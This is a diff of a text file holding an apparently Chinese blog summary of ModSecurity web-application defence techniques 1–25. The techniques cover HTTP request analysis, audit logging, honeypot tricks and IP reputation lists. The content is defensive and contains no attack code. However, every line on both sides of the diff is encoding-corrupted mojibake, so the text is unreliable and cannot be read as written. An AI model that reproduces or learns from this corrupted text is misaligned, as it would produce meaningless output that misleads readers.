@@ -1,331 +1,331 @@
-webÓ¦ÓÃ°²È«·ÀÓù100¼¼  
+webåº”ç”¨å®‰å…¨é˜²å¾¡100æŠ€  
 
-Ô­ÎÄ http://danqingdani.blog.163.com/blog/static/186094195201411204383402/
+åŽŸæ–‡ http://danqingdani.blog.163.com/blog/static/186094195201411204383402/
 
-ÈçºÎ½øÐÐwebÓ¦ÓÃ°²È«·ÀÓù£¬ÊÇÃ¿¸öweb°²È«´ÓÒµÕß¶¼»á±»ÎÊµ½µÄÎÊÌâ£¬·Ç³£²»ºÃ»Ø´ð£¬ÈÝÒ×¹ýÓÚ·ôÇ³»òÁ÷ÓÚÀíÂÛ£¬Òª²ûÃ÷Çå³þ£¬´ð°¸¾ÍÊÇÒ»±¾ÊéµÄ³¤¶È¡£¶ø±¾ÎÄÒª½éÉÜÒ»±¾ÄÜºÜºÃ»Ø´ðÕâ¸öÎÊÌâµÄÓÅÐãÊé¼®¡ª¡ª¡¶web application defender's cookbook¡·£¬Õâ ÊÇÒ»±¾±»µÍ¹ÀµÄ¡°¸É»õ¡±Êé¼®£¬ËäÈ»ÊÇÎªModSecurityÁ¿Éí¶¨ÖÆ£¬µ«ÀïÃæÌáµ½µÄ·ÀÓù¼¼ÇÉ¶Ôweb°²È«´ÓÒµÕß¾ùÓÐÆô·¢£¬ÊÇWAF°æµÄËï×Ó±ø·¨£¨ÓÐÈ¤µÄÊÇ£¬Õâ±¾ÊéµÄÃ¿¸öÕÂ½Ú¾ùÒÔËï×Ó±ø·¨×÷Îª¿ªÆªÓï£©¡£
+å¦‚ä½•è¿›è¡Œwebåº”ç”¨å®‰å…¨é˜²å¾¡ï¼Œæ˜¯æ¯ä¸ªwebå®‰å…¨ä»Žä¸šè€…éƒ½ä¼šè¢«é—®åˆ°çš„é—®é¢˜ï¼Œéžå¸¸ä¸å¥½å›žç­”ï¼Œå®¹æ˜“è¿‡äºŽè‚¤æµ…æˆ–æµäºŽç†è®ºï¼Œè¦é˜æ˜Žæ¸…æ¥šï¼Œç­”æ¡ˆå°±æ˜¯ä¸€æœ¬ä¹¦çš„é•¿åº¦ã€‚è€Œæœ¬æ–‡è¦ä»‹ç»ä¸€æœ¬èƒ½å¾ˆå¥½å›žç­”è¿™ä¸ªé—®é¢˜çš„ä¼˜ç§€ä¹¦ç±â€”â€”ã€Šweb application defender's cookbookã€‹ï¼Œè¿™ æ˜¯ä¸€æœ¬è¢«ä½Žä¼°çš„â€œå¹²è´§â€ä¹¦ç±ï¼Œè™½ç„¶æ˜¯ä¸ºModSecurityé‡èº«å®šåˆ¶ï¼Œä½†é‡Œé¢æåˆ°çš„é˜²å¾¡æŠ€å·§å¯¹webå®‰å…¨ä»Žä¸šè€…å‡æœ‰å¯å‘ï¼Œæ˜¯WAFç‰ˆçš„å­™å­å…µæ³•ï¼ˆæœ‰è¶£çš„æ˜¯ï¼Œè¿™æœ¬ä¹¦çš„æ¯ä¸ªç« èŠ‚å‡ä»¥å­™å­å…µæ³•ä½œä¸ºå¼€ç¯‡è¯­ï¼‰ã€‚
 
-Õâ±¾ÊéÌá³öÁËÊ¹ÓÃModSecurity½øÐÐwebÓ¦ÓÃ°²È«·ÀÓùµÄ100¸ö¼¼ÇÉ£¬Ã¿¸ö¼¼ÇÉ¶¼ÓÃÕæÊµµÄ°¸ÀýÀ´ËµÃ÷£¬·Ç³£ÈÝÒ×ÕÆÎÕ£¬ÏÂÎÄ½éÉÜÕâ100¼¼¼°¸öÈËµãÆÀ£¨ÒÑ¾­×¼±¸ºÃ±»ÅçÁË:)£©¡£
+è¿™æœ¬ä¹¦æå‡ºäº†ä½¿ç”¨ModSecurityè¿›è¡Œwebåº”ç”¨å®‰å…¨é˜²å¾¡çš„100ä¸ªæŠ€å·§ï¼Œæ¯ä¸ªæŠ€å·§éƒ½ç”¨çœŸå®žçš„æ¡ˆä¾‹æ¥è¯´æ˜Žï¼Œéžå¸¸å®¹æ˜“æŽŒæ¡ï¼Œä¸‹æ–‡ä»‹ç»è¿™100æŠ€åŠä¸ªäººç‚¹è¯„ï¼ˆå·²ç»å‡†å¤‡å¥½è¢«å–·äº†:)ï¼‰ã€‚
 
-µÚ1¼¼ ÊµÊ±·ÖÎöHTTPÇëÇóÌØÕ÷
-ÀýÈçÇëÇó·½·¨£¬²ÎÊýÃû£¬²ÎÊý¸öÊý£¬²ÎÊý³¤¶È£¬²ÎÊýÈ¡ÖµÀàÐÍ£¨Êý×Ö£¬×ÖÄ¸£¬email, URL»òÎÄ¼þÂ·¾¶£©
-ÄÔ¶´£º¸øHTTPÇëÇó×ö°×Ãûµ¥£¬»òÎªÁË×¼È·¶È¸ø³öÏÖ¹ýÂ©¶´µÄURI×ö°×Ãûµ¥
+ç¬¬1æŠ€ å®žæ—¶åˆ†æžHTTPè¯·æ±‚ç‰¹å¾
+ä¾‹å¦‚è¯·æ±‚æ–¹æ³•ï¼Œå‚æ•°åï¼Œå‚æ•°ä¸ªæ•°ï¼Œå‚æ•°é•¿åº¦ï¼Œå‚æ•°å–å€¼ç±»åž‹ï¼ˆæ•°å­—ï¼Œå­—æ¯ï¼Œemail, URLæˆ–æ–‡ä»¶è·¯å¾„ï¼‰
+è„‘æ´žï¼šç»™HTTPè¯·æ±‚åšç™½åå•ï¼Œæˆ–ä¸ºäº†å‡†ç¡®åº¦ç»™å‡ºçŽ°è¿‡æ¼æ´žçš„URIåšç™½åå•
 
-2015-12-11:  httpÇëÇó·ÖÎö£¬´Ó³¤Ô¶À´¿´£¬ÓÐÐ©»ù±¾ÐÅÏ¢¿â±ØÐë½¨Á¢£¬URL¿â¾ÍÊÇÆäÖÐÒ»¸ö£¬À´¸ú½øÃ¿¸öÕ¾µãµÄURL±ä»¯£¨°üÀ¨Ê×´Î·ÃÎÊÊ±¼ä£¬×îºó·ÃÎÊÊ±¼ä£¬½¨Õ¾Ö¸ÎÆ£¬Â©¶´ÁÐ±í£©
+2015-12-11:  httpè¯·æ±‚åˆ†æžï¼Œä»Žé•¿è¿œæ¥çœ‹ï¼Œæœ‰äº›åŸºæœ¬ä¿¡æ¯åº“å¿…é¡»å»ºç«‹ï¼ŒURLåº“å°±æ˜¯å…¶ä¸­ä¸€ä¸ªï¼Œæ¥è·Ÿè¿›æ¯ä¸ªç«™ç‚¹çš„URLå˜åŒ–ï¼ˆåŒ…æ‹¬é¦–æ¬¡è®¿é—®æ—¶é—´ï¼Œæœ€åŽè®¿é—®æ—¶é—´ï¼Œå»ºç«™æŒ‡çº¹ï¼Œæ¼æ´žåˆ—è¡¨ï¼‰
 e.g.
-xxx.xxx.xxx/plus/mytag_js.php?aid  DeDeCMSÏµÍ³    DeDeCMSÒ»¾ä»°Ð´ÂíÂ©¶´   xxxxxxxÊ×´Î·ÃÎÊ    xxxxx×îºó·ÃÎÊ ...
-(p.s. »ù±¾ÐÅÏ¢¿â»ù±¾ºÜÄÑ½¨Á¢ÆðÀ´£¬½¨Á¢ÁËÒ²ºÜÄÑÎ¬³Ö¸üÐÂ£¬Ô­ÒòÂï£¬¶¼ÖªµÀµÄ£©
+xxx.xxx.xxx/plus/mytag_js.php?aid  DeDeCMSç³»ç»Ÿ    DeDeCMSä¸€å¥è¯å†™é©¬æ¼æ´ž   xxxxxxxé¦–æ¬¡è®¿é—®    xxxxxæœ€åŽè®¿é—® ...
+(p.s. åŸºæœ¬ä¿¡æ¯åº“åŸºæœ¬å¾ˆéš¾å»ºç«‹èµ·æ¥ï¼Œå»ºç«‹äº†ä¹Ÿå¾ˆéš¾ç»´æŒæ›´æ–°ï¼ŒåŽŸå› å˜›ï¼Œéƒ½çŸ¥é“çš„ï¼‰
 
-µÚ2¼¼  ÑéÖ¤hash tokenÔ¤·ÀÊý¾Ý´Û¸Ä
-ÀýÈç£º http://xxx.xxx.xxx/?p=4&rv_token=aafb509403bbf7d78c3c8fe1735d49f01b90eb64
-rv_tokenµÄÑéÖ¤
+ç¬¬2æŠ€  éªŒè¯hash tokené¢„é˜²æ•°æ®ç¯¡æ”¹
+ä¾‹å¦‚ï¼š http://xxx.xxx.xxx/?p=4&rv_token=aafb509403bbf7d78c3c8fe1735d49f01b90eb64
+rv_tokençš„éªŒè¯
 
-µÚ3¼¼ °²×°OWASP ModSecurity CRS
-¸Ã¹æÔò¼¯ÓÐÁ½ÖÖÄ£Ê½£¬Ò»ÖÖ¶ÀÁ¢¼ì²âÄ£Ê½£¬Ò»ÖÖÐ­Í¬¼ì²âÄ£Ê½£¨¹æÔòÆÀ·ÖÖÆ£©
+ç¬¬3æŠ€ å®‰è£…OWASP ModSecurity CRS
+è¯¥è§„åˆ™é›†æœ‰ä¸¤ç§æ¨¡å¼ï¼Œä¸€ç§ç‹¬ç«‹æ£€æµ‹æ¨¡å¼ï¼Œä¸€ç§ååŒæ£€æµ‹æ¨¡å¼ï¼ˆè§„åˆ™è¯„åˆ†åˆ¶ï¼‰
 
-µÚ4¼¼ ½«IDS Snort¹æÔò×ª»»ÎªModSecurity¹æÔò
-Ê¹ÓÃ snort2modsec2.pl½Å±¾½«Snort¹æÔò×ª»»ÎªModSecurity¹æÔò
-ÄÔ¶´£º°²È«·ÀÓùÊÇ¸öÕûÌå£¬½«¸÷¸ö¹Ø¿¨ÓÐÐ§µØÁª¶¯ÆðÀ´ÐÎ³É±ÚÀÝ
+ç¬¬4æŠ€ å°†IDS Snortè§„åˆ™è½¬æ¢ä¸ºModSecurityè§„åˆ™
+ä½¿ç”¨ snort2modsec2.plè„šæœ¬å°†Snortè§„åˆ™è½¬æ¢ä¸ºModSecurityè§„åˆ™
+è„‘æ´žï¼šå®‰å…¨é˜²å¾¡æ˜¯ä¸ªæ•´ä½“ï¼Œå°†å„ä¸ªå…³å¡æœ‰æ•ˆåœ°è”åŠ¨èµ·æ¥å½¢æˆå£åž’
 
-2015-12-11: ¹æÔòÒ»Ö±±»ÆçÊÓ£¨Ã²ËÆ²»±íÊ¾ÏÂÆçÊÓ¾Ílow£©£¬µ«ÎÒÃÇÓÃÊÂÊµËµ»°£¬¿´¿´Ö÷Òª°²È«²úÆ·µÄÖ÷Òª·ÀÓù·½Ê½°É£¬ÆäÖÐ¹æÔò±»Ú¸²¡µÄÖ÷ÒªÔ­Òò£º
-£¨1£©ÐÄÀíÔ­Òò£¬¾õµÃÈËÈË¶¼ÄÜÐ´£¬²»¸ß¶Ë
-£¨2£©Êµ¼ÊÐ§¹û£¬×Ü±»ÈÆ¹ý, ¹æÔòÐèÒª³ÖÐøÎ¬»¤µÄ³É±¾
-¾²Ì¬¹æÔòÈç¹ûÓÐÒ»Ì××Ô¶¯»¯µÄÔËÎ¬ÏµÍ³À´Ö§³Å¾ÍÄÜ³ÖÐø·¢»Ó×÷ÓÃ
-£¨1£©×Ô¶¯»¯¹æÔòÂ©±¨£¯Îó±¨¼ì²â£º»ùÓÚÒì³£¼ì²âÀ´Ö§³ÅÂ©±¨£¬»ùÓÚÍ³¼ÆãÐÖµÀ´Ö§³ÅÎó±¨£¨ÒÑÊµ¼ù£¬Ð§¹û²»´í£©
-£¨2£©¹æÔò×Ô¶¯»¯ÌáÈ¡Éú³É£ºÉÏÒ»²½µÄ½á¹û×Ô¶¯Éú³É¹æÔò£¬Î´Êµ¼ù
-£¨3£©¾²Ì¬¹æÔòµÄ·Ö¼¶·ÀÓù£º½áºÏÂ©¶´¿â£¬¶Ô³öÏÖ¹ýÂ©¶´µÄpathµ÷Õû·ÀÓù¼¶±ð
-£¨4£©¹æÔòµÄÍ¨ÓÃÐÔ×ª»»£ºÂ©¶´É¨Ãè±¨¸æ×ª»¯Îª·ÀÓù¹æÔò£¬
+2015-12-11: è§„åˆ™ä¸€ç›´è¢«æ­§è§†ï¼ˆè²Œä¼¼ä¸è¡¨ç¤ºä¸‹æ­§è§†å°±lowï¼‰ï¼Œä½†æˆ‘ä»¬ç”¨äº‹å®žè¯´è¯ï¼Œçœ‹çœ‹ä¸»è¦å®‰å…¨äº§å“çš„ä¸»è¦é˜²å¾¡æ–¹å¼å§ï¼Œå…¶ä¸­è§„åˆ™è¢«è¯Ÿç—…çš„ä¸»è¦åŽŸå› ï¼š
+ï¼ˆ1ï¼‰å¿ƒç†åŽŸå› ï¼Œè§‰å¾—äººäººéƒ½èƒ½å†™ï¼Œä¸é«˜ç«¯
+ï¼ˆ2ï¼‰å®žé™…æ•ˆæžœï¼Œæ€»è¢«ç»•è¿‡, è§„åˆ™éœ€è¦æŒç»­ç»´æŠ¤çš„æˆæœ¬
+é™æ€è§„åˆ™å¦‚æžœæœ‰ä¸€å¥—è‡ªåŠ¨åŒ–çš„è¿ç»´ç³»ç»Ÿæ¥æ”¯æ’‘å°±èƒ½æŒç»­å‘æŒ¥ä½œç”¨
+ï¼ˆ1ï¼‰è‡ªåŠ¨åŒ–è§„åˆ™æ¼æŠ¥ï¼è¯¯æŠ¥æ£€æµ‹ï¼šåŸºäºŽå¼‚å¸¸æ£€æµ‹æ¥æ”¯æ’‘æ¼æŠ¥ï¼ŒåŸºäºŽç»Ÿè®¡é˜ˆå€¼æ¥æ”¯æ’‘è¯¯æŠ¥ï¼ˆå·²å®žè·µï¼Œæ•ˆæžœä¸é”™ï¼‰
+ï¼ˆ2ï¼‰è§„åˆ™è‡ªåŠ¨åŒ–æå–ç”Ÿæˆï¼šä¸Šä¸€æ­¥çš„ç»“æžœè‡ªåŠ¨ç”Ÿæˆè§„åˆ™ï¼Œæœªå®žè·µ
+ï¼ˆ3ï¼‰é™æ€è§„åˆ™çš„åˆ†çº§é˜²å¾¡ï¼šç»“åˆæ¼æ´žåº“ï¼Œå¯¹å‡ºçŽ°è¿‡æ¼æ´žçš„pathè°ƒæ•´é˜²å¾¡çº§åˆ«
+ï¼ˆ4ï¼‰è§„åˆ™çš„é€šç”¨æ€§è½¬æ¢ï¼šæ¼æ´žæ‰«ææŠ¥å‘Šè½¬åŒ–ä¸ºé˜²å¾¡è§„åˆ™ï¼Œ
 
-µÚ5¼¼ Ê¹ÓÃ±´Ò¶Ë¹·ÖÀàËã·¨Çø·Ö¶ñÒâÇëÇó
+ç¬¬5æŠ€ ä½¿ç”¨è´å¶æ–¯åˆ†ç±»ç®—æ³•åŒºåˆ†æ¶æ„è¯·æ±‚
 
-µÚ6¼¼ ¿ªÆôHTTPÈÕÖ¾Éó¼Æ£¬ÉèÖÃÁ£¶ÈÎªÈ«²¿¼ÇÂ¼
+ç¬¬6æŠ€ å¼€å¯HTTPæ—¥å¿—å®¡è®¡ï¼Œè®¾ç½®ç²’åº¦ä¸ºå…¨éƒ¨è®°å½•
 
-µÚ7¼¼ ¿ªÆôHTTPÈÕÖ¾Éó¼Æ£¬ÉèÖÃÁ£¶ÈÎª²¿·Ö¼ÇÂ¼
-ÀýÈçÖ»¼ÇÂ¼ÏìÓ¦ÂëÎª4xxµÄHTTPÇëÇó
+ç¬¬7æŠ€ å¼€å¯HTTPæ—¥å¿—å®¡è®¡ï¼Œè®¾ç½®ç²’åº¦ä¸ºéƒ¨åˆ†è®°å½•
+ä¾‹å¦‚åªè®°å½•å“åº”ç ä¸º4xxçš„HTTPè¯·æ±‚
 
-µÚ8¼¼ ¿ªÆôHTTPÈÕÖ¾Éó¼Æ£¬²»¼ÇÂ¼¾²Ì¬×ÊÔ´·ÃÎÊÇëÇó
+ç¬¬8æŠ€ å¼€å¯HTTPæ—¥å¿—å®¡è®¡ï¼Œä¸è®°å½•é™æ€èµ„æºè®¿é—®è¯·æ±‚
 
-µÚ9¼¼ ½«HTTPÈÕÖ¾ÖÐµÄÃô¸ÐÐÅÏ¢£ª£ª£ª£ª»¯
-ÄÔ¶´£º³ö·¢µãÊÇ×ðÖØÓÃ»§ÒþË½£¬µ«ÊÇ²»ÉÙCDN³§ÉÌ²¢²»»áÕâÑù×ö
+ç¬¬9æŠ€ å°†HTTPæ—¥å¿—ä¸­çš„æ•æ„Ÿä¿¡æ¯ï¼Šï¼Šï¼Šï¼ŠåŒ–
+è„‘æ´žï¼šå‡ºå‘ç‚¹æ˜¯å°Šé‡ç”¨æˆ·éšç§ï¼Œä½†æ˜¯ä¸å°‘CDNåŽ‚å•†å¹¶ä¸ä¼šè¿™æ ·åš
 
-µÚ10¼¼ Ê¹ÓÃsyslog½«server¾¯¸æÐÅÏ¢×ª·¢¸øÖÐÐÄÈÕÖ¾Æ½Ì¨
-×÷ÓÃÓÚ·Ö²¼Ê½/Ð­Í¬·ÀÓùÏµÍ³ÖÐµÄÈÕÖ¾ÊÕ¼¯½×¶Î£¬ÀýÈçµÝ½»¸øSIEMÏµÍ³½øÐÐ·ÖÎö
-2015-12-11: ÈÕÖ¾·ÖÎö¼¼Êõ²¢²»ÊÇÐÂÏÊµÄ¸ÅÄî£¬·¢Õ¹µÄÖ»ÊÇ·ÖÎöµÄÖ§³ÅÆ½Ì¨£¨´æ´¢¼ÆËã£©£¬Ìá¸ßµÄÊÇ´¦ÀíÁ¿¼¶ÓëÐ§ÂÊ£¬£¨»úÆ÷Ñ§Ï°Ëã·¨ÔÝ²»ÆÀ¼Û£¬ÒòÎª²¢Î´ÉîÈë£©£¬·ÖÎöµÄºËÐÄ»¹ÊÇ·ÖÎöÕßµÄ×¨ÒµÖªÊ¶Óë¾­Ñé£¨ÌØ±ðÊÇ¾­Ñé£¬°²È«·ÀÓùÊÇÌØ±ðÐèÒª¾­ÑéµÄ£¬´¦ÀíµÄcase¶àÁË£¬´ó¶àÊýÊÂÇé¾ÍÄÜhold×¡ÁË£©¡£
+ç¬¬10æŠ€ ä½¿ç”¨syslogå°†serverè­¦å‘Šä¿¡æ¯è½¬å‘ç»™ä¸­å¿ƒæ—¥å¿—å¹³å°
+ä½œç”¨äºŽåˆ†å¸ƒå¼/ååŒé˜²å¾¡ç³»ç»Ÿä¸­çš„æ—¥å¿—æ”¶é›†é˜¶æ®µï¼Œä¾‹å¦‚é€’äº¤ç»™SIEMç³»ç»Ÿè¿›è¡Œåˆ†æž
+2015-12-11: æ—¥å¿—åˆ†æžæŠ€æœ¯å¹¶ä¸æ˜¯æ–°é²œçš„æ¦‚å¿µï¼Œå‘å±•çš„åªæ˜¯åˆ†æžçš„æ”¯æ’‘å¹³å°ï¼ˆå­˜å‚¨è®¡ç®—ï¼‰ï¼Œæé«˜çš„æ˜¯å¤„ç†é‡çº§ä¸Žæ•ˆçŽ‡ï¼Œï¼ˆæœºå™¨å­¦ä¹ ç®—æ³•æš‚ä¸è¯„ä»·ï¼Œå› ä¸ºå¹¶æœªæ·±å…¥ï¼‰ï¼Œåˆ†æžçš„æ ¸å¿ƒè¿˜æ˜¯åˆ†æžè€…çš„ä¸“ä¸šçŸ¥è¯†ä¸Žç»éªŒï¼ˆç‰¹åˆ«æ˜¯ç»éªŒï¼Œå®‰å…¨é˜²å¾¡æ˜¯ç‰¹åˆ«éœ€è¦ç»éªŒçš„ï¼Œå¤„ç†çš„caseå¤šäº†ï¼Œå¤§å¤šæ•°äº‹æƒ…å°±èƒ½holdä½äº†ï¼‰ã€‚
 
-µÚ11¼¼ Ê¹ÓÃ¸üÎªÓÑºÃµÄModSecurity µÄÉó¼Æ¿ØÖÆÆ½Ì¨AuditConsole
+ç¬¬11æŠ€ ä½¿ç”¨æ›´ä¸ºå‹å¥½çš„ModSecurity çš„å®¡è®¡æŽ§åˆ¶å¹³å°AuditConsole
 
-µÚ12¼¼ ±»¶¯µÄÂ©¶´Ê¶±ð·½°¸£­Í¨¹ý¶ÁÈ¡Â©¶´¿â£¨ÀýÈçOSVDB£©À´Ê¶±ðÂ©¶´´Ó¶ø½øÐÐ·ÀÓù
-2015-12-11: °²È«·ÀÓù×ÜÌåËµÊÇÂ©¶´Çý¶¯µÄ£¬ÇÆÇÆÓÐ¶àÉÙ×öÂ©¶´Æ½Ì¨µÄ£¬ÎÞÂÛ¹Ù·½µÄ»¹ÊÇµØÏÂµÄ
-Ð¡Ð¡µÄ¸Ð¿®ÏÂ£¬°²È«´ÓÒµÈËÔ±µÄÔö¶à²¢Ã»ÓÐÊ¹µÃÍøÂç°²È«»·¾³±äºÃ·´¶øÊÇ¶ñ»¯£¬ÉÍ½ðÖÆ¶ÈµÄÍÚ¶´£¬´ß·¢³ö¶àÉÙÎ´ÊÚÈ¨µÄÉøÍ¸ÐÐÎª£¬¶ÔÂ©¶´Æ½Ì¨ÈËÔ±ËùËµµÄÂ©¶´Æ½Ì¨»áÒýµ¼ºÚÃ±×Ó³ÖÖÊÒÉµÄÌ¬¶È¡£
+ç¬¬12æŠ€ è¢«åŠ¨çš„æ¼æ´žè¯†åˆ«æ–¹æ¡ˆï¼é€šè¿‡è¯»å–æ¼æ´žåº“ï¼ˆä¾‹å¦‚OSVDBï¼‰æ¥è¯†åˆ«æ¼æ´žä»Žè€Œè¿›è¡Œé˜²å¾¡
+2015-12-11: å®‰å…¨é˜²å¾¡æ€»ä½“è¯´æ˜¯æ¼æ´žé©±åŠ¨çš„ï¼Œçž§çž§æœ‰å¤šå°‘åšæ¼æ´žå¹³å°çš„ï¼Œæ— è®ºå®˜æ–¹çš„è¿˜æ˜¯åœ°ä¸‹çš„
+å°å°çš„æ„Ÿæ…¨ä¸‹ï¼Œå®‰å…¨ä»Žä¸šäººå‘˜çš„å¢žå¤šå¹¶æ²¡æœ‰ä½¿å¾—ç½‘ç»œå®‰å…¨çŽ¯å¢ƒå˜å¥½åè€Œæ˜¯æ¶åŒ–ï¼Œèµé‡‘åˆ¶åº¦çš„æŒ–æ´žï¼Œå‚¬å‘å‡ºå¤šå°‘æœªæŽˆæƒçš„æ¸—é€è¡Œä¸ºï¼Œå¯¹æ¼æ´žå¹³å°äººå‘˜æ‰€è¯´çš„æ¼æ´žå¹³å°ä¼šå¼•å¯¼é»‘å¸½å­æŒè´¨ç–‘çš„æ€åº¦ã€‚
 
-Å×¿ª¸öÈËÇéÐ÷£¬Â©¶´¿âÔÚ·ÀÓùÉÏ·Ç³£ÓÐÓÃ¡£µÚ4¼¼ÓÐËµÃ÷
+æŠ›å¼€ä¸ªäººæƒ…ç»ªï¼Œæ¼æ´žåº“åœ¨é˜²å¾¡ä¸Šéžå¸¸æœ‰ç”¨ã€‚ç¬¬4æŠ€æœ‰è¯´æ˜Ž
 
-µÚ13¼¼ Ö÷¶¯µÄÂ©¶´Ê¶±ð·½°¸£­µ÷ÓÃÉ¨ÃèÆ÷£¨ÀýÈçArachni£©À´Ê¶±ðÂ©¶´´Ó¶ø½øÐÐ·ÀÓù
+ç¬¬13æŠ€ ä¸»åŠ¨çš„æ¼æ´žè¯†åˆ«æ–¹æ¡ˆï¼è°ƒç”¨æ‰«æå™¨ï¼ˆä¾‹å¦‚Arachniï¼‰æ¥è¯†åˆ«æ¼æ´žä»Žè€Œè¿›è¡Œé˜²å¾¡
 
-µÚ14¼¼  ½«É¨ÃèÆ÷½á¹ûÊÖ¶¯×ª»¯Îª·ÀÓù¹æÔò
+ç¬¬14æŠ€  å°†æ‰«æå™¨ç»“æžœæ‰‹åŠ¨è½¬åŒ–ä¸ºé˜²å¾¡è§„åˆ™
 
-µÚ15¼¼  ½«É¨ÃèÆ÷½á¹û×Ô¶¯×ª»¯Îª·ÀÓù¹æÔò
-Ê¹ÓÃ Arachi2modsec.pl½Å±¾½«arachiÉ¨Ãè±¨¸æ×ª»»ÎªModSecurity¹æÔò
+ç¬¬15æŠ€  å°†æ‰«æå™¨ç»“æžœè‡ªåŠ¨è½¬åŒ–ä¸ºé˜²å¾¡è§„åˆ™
+ä½¿ç”¨ Arachi2modsec.plè„šæœ¬å°†arachiæ‰«ææŠ¥å‘Šè½¬æ¢ä¸ºModSecurityè§„åˆ™
 
-µÚ16¼¼ ÊµÊ±µ÷ÓÃÉ¨ÃèÆ÷£¨ÀýÈçArachni RPC£©½øÐÐ·ÀÓù
+ç¬¬16æŠ€ å®žæ—¶è°ƒç”¨æ‰«æå™¨ï¼ˆä¾‹å¦‚Arachni RPCï¼‰è¿›è¡Œé˜²å¾¡
 
-µÚ17¼¼ ÉèÖÃhoneypot£¬ÐÂ¿ª¼àÌý¶Ë¿Ú
+ç¬¬17æŠ€ è®¾ç½®honeypotï¼Œæ–°å¼€ç›‘å¬ç«¯å£
 
-µÚ18¼¼ ÉèÖÃhoneypot£¬Î±Ôìrobots.txt disallow ÏîÓëÎ±Ôì401ÇëÇóÉí·ÝÑéÖ¤µÄÇëÇó
-ÄÔ¶´£ºÆäÊµÔÚÖÐ¹úÇøÒ²·¢Éú¹ý¡°Õý¹æ¡±ËÑË÷ÒýÇæ²»×ñÊØrobotsÐ­Òé£¬ÅÀÈ¡disallowÂ·¾¶µÄ°¸Àý
+ç¬¬18æŠ€ è®¾ç½®honeypotï¼Œä¼ªé€ robots.txt disallow é¡¹ä¸Žä¼ªé€ 401è¯·æ±‚èº«ä»½éªŒè¯çš„è¯·æ±‚
+è„‘æ´žï¼šå…¶å®žåœ¨ä¸­å›½åŒºä¹Ÿå‘ç”Ÿè¿‡â€œæ­£è§„â€æœç´¢å¼•æ“Žä¸éµå®ˆrobotsåè®®ï¼Œçˆ¬å–disallowè·¯å¾„çš„æ¡ˆä¾‹
 
-µÚ19¼¼ ÉèÖÃhoneypot£¬Î±ÔìHTML×¢ÊÍ
-ÄÔ¶´£ººÚ¿ÍÒ»°ã»áÔÚHTML´úÂë×¢ÊÍÇøÕÒÃô¸ÐÐÅÏ¢£¬Burpsuite¾Í×¨ÃÅÌá¹©ÁË"find comments"¹¦ÄÜ¡£ÀýÈçÔÚ×¢ÊÍÇøÔö¼ÓÒ»¸ö²»´æÔÚµÄuriÀ´²¶»ñºÚ¿Í
+ç¬¬19æŠ€ è®¾ç½®honeypotï¼Œä¼ªé€ HTMLæ³¨é‡Š
+è„‘æ´žï¼šé»‘å®¢ä¸€èˆ¬ä¼šåœ¨HTMLä»£ç æ³¨é‡ŠåŒºæ‰¾æ•æ„Ÿä¿¡æ¯ï¼ŒBurpsuiteå°±ä¸“é—¨æä¾›äº†"find comments"åŠŸèƒ½ã€‚ä¾‹å¦‚åœ¨æ³¨é‡ŠåŒºå¢žåŠ ä¸€ä¸ªä¸å­˜åœ¨çš„uriæ¥æ•èŽ·é»‘å®¢
 
-µÚ20¼¼ ÉèÖÃhoneypot£¬Î±ÔìÒþ²Ø±íµ¥Óò£¨hidden form fields£©
-ÀýÈçÔö¼ÓÒ»¸öÒþ²Ø±íµ¥×Ö¶Îdebug£¬Èç¹ûHTTPÇëÇóÖÐ°üº¬Õâ¸öÒþ²Ø±íµ¥£¬ËµÃ÷ÇëÇó¾ÍÓÐ¹¥»÷ÒâÏò
+ç¬¬20æŠ€ è®¾ç½®honeypotï¼Œä¼ªé€ éšè—è¡¨å•åŸŸï¼ˆhidden form fieldsï¼‰
+ä¾‹å¦‚å¢žåŠ ä¸€ä¸ªéšè—è¡¨å•å­—æ®µdebugï¼Œå¦‚æžœHTTPè¯·æ±‚ä¸­åŒ…å«è¿™ä¸ªéšè—è¡¨å•ï¼Œè¯´æ˜Žè¯·æ±‚å°±æœ‰æ”»å‡»æ„å‘
 
-µÚ21¼¼ ÉèÖÃhoneypot£¬Î±Ôìcookie
+ç¬¬21æŠ€ è®¾ç½®honeypotï¼Œä¼ªé€ cookie
 
-µÚ22¼¼ Ê¹ÓÃIPÐÅÓþ¿â£¬²éÑ¯·ÃÎÊÕßIPÐÅÏ¢
-ÄÔ¶´£º MaxMind IP¿â£¬¹À¼ÆÃ»ÓÐÈËÃ»ÌýËµ¹ý
+ç¬¬22æŠ€ ä½¿ç”¨IPä¿¡èª‰åº“ï¼ŒæŸ¥è¯¢è®¿é—®è€…IPä¿¡æ¯
+è„‘æ´žï¼š MaxMind IPåº“ï¼Œä¼°è®¡æ²¡æœ‰äººæ²¡å¬è¯´è¿‡
 
-µÚ23¼¼ Ê¹ÓÃIPÐÅÓþ¿â£¬Ê¶±ð¶ñÒâ¶ñÒâ´úÀí
+ç¬¬23æŠ€ ä½¿ç”¨IPä¿¡èª‰åº“ï¼Œè¯†åˆ«æ¶æ„æ¶æ„ä»£ç†
 
-µÚ24¼¼ µ÷ÓÃÔÚÏßRBL(real-time blacklist)¿â£¨ÀýÈçsbl-xbl.spamhaus.org£©£¬Ê¶±ð¶ñÒâIP
-ÔÚÏß²éÑ¯¹ú¼Ê·´À¬»øÓÊ¼þ×éÖ¯Ìá¹©µÄIPºÚ¿â£¬»òÕßµ÷ÓÃ¿ªÔ´µÄIPºÚÃûµ¥ÊÕ¼¯ÃÛ¹ÞAPI½Ó¿ÚHTTPBL£¨Honeypot HTTP Blacklist£©½øÐÐIPÐÅÓþ²éÑ¯
+ç¬¬24æŠ€ è°ƒç”¨åœ¨çº¿RBL(real-time blacklist)åº“ï¼ˆä¾‹å¦‚sbl-xbl.spamhaus.orgï¼‰ï¼Œè¯†åˆ«æ¶æ„IP
+åœ¨çº¿æŸ¥è¯¢å›½é™…ååžƒåœ¾é‚®ä»¶ç»„ç»‡æä¾›çš„IPé»‘åº“ï¼Œæˆ–è€…è°ƒç”¨å¼€æºçš„IPé»‘åå•æ”¶é›†èœœç½APIæŽ¥å£HTTPBLï¼ˆHoneypot HTTP Blacklistï¼‰è¿›è¡ŒIPä¿¡èª‰æŸ¥è¯¢
 
-µÚ25¼¼ ´´½¨×Ô¼ºµÄRBL
-Ê¹ÓÃjwall-rbld´´½¨×Ô¼ºµÄRBL£¬https://jwall.org/ Ìá¹©ÁË²»ÉÙjava±àÐ´µÄweb°²È«¹¤¾ß
+ç¬¬25æŠ€ åˆ›å»ºè‡ªå·±çš„RBL
+ä½¿ç”¨jwall-rbldåˆ›å»ºè‡ªå·±çš„RBLï¼Œhttps://jwall.org/ æä¾›äº†ä¸å°‘javaç¼–å†™çš„webå®‰å…¨å·¥å…·
 
